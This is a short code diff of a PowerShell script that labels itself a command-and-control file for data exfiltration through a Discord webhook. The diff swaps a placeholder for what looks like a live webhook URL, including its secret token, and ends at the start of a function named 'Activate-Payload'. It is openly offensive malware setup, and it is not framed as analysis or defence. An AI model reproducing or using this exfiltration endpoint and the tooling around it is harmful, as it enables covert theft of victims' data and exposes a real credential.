@@ -2,7 +2,7 @@
 # C2 File for Data Exfiltration with Discord Webhook
 
 # Webhook URL for Discord
-$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+$webhook="https://discord.com/api/webhooks/1286741986916831262/DkwD8niXfjC8wWV0zJfFBTtWIBR-JUfnM9LAb6mHHiK2fx-XyKYdgE_TsKZlgXDPH7KO";
 
 # Control commands
 function Activate-Payload {
